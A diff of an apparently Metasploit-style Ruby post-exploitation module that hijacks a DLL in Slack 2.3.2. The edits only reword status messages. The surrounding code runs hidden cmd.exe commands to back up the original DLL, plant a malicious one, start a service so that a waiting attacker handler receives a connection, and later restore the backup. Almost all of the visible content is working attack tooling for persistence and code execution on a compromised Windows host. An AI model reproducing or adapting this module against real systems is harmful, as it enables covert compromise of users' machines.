@@ -162,7 +162,7 @@ def ls_stage1
     if client.fs.file.exist?("#{d_path}\\#{p_name}")
       print_warning(" Vulnerable dll agent: #{p_name} found...")
       # backup original dll using cmd.exe COPY command...
-      print_good(" Backup original dll...")
+      print_good(" Backup original slack software dll...")
       r = session.sys.process.execute("cmd.exe /c COPY /Y #{d_path}\\#{p_name} #{d_path}\\libEGL.bk", nil, {'Hidden' => true, 'Channelized' => true})
       sleep(1.0)
 
@@ -180,13 +180,13 @@ def ls_stage1
         sleep(1.0)
 
           # start remote malicious service
-          print_status("Sart remote service...")
+          print_status("Sart slack 2.3.2 remote service...")
           r = session.sys.process.execute("cmd.exe /c sc start #{s_name}", nil, {'Hidden' => true, 'Channelized' => true})
           sleep(1.5)
 
         # task completed successefully...
         print_status("Malicious dll placed successefuly...")
-        print_status("Sart one handler and wait for connection!")
+        print_status("If you have set a handler befor... congratz!")
         print_line("")
 
       # close channel when done
@@ -194,8 +194,8 @@ def ls_stage1
       r.close
 
     else
-      print_error("ABORT: post-module cant find original dll...")
-      print_error("original dll: #{d_path}\\#{p_name}")
+      print_error("[ ABORT ]: post-module cant find original dll...")
+      print_error("slack_ dll: #{d_path}\\#{p_name}")
       print_line("")
     end
 
@@ -227,7 +227,7 @@ def ls_stage2
     print_warning("Please set REVERT_HIJACK option!")
     return nil
   else
-    print_status("Deleting malicious dll!")
+    print_status("Deleting malicious dll.")
     sleep(1.5)
   end
 
@@ -251,7 +251,7 @@ def ls_stage2
     r.close
 
     else
-      print_error("ABORT: post-module cant find backup dll...")
+      print_error("[ ABORT ]: post-module cant find backup dll...")
       print_error("backup dll: #{d_path}\\#{b_name}")
       print_line("")
     end
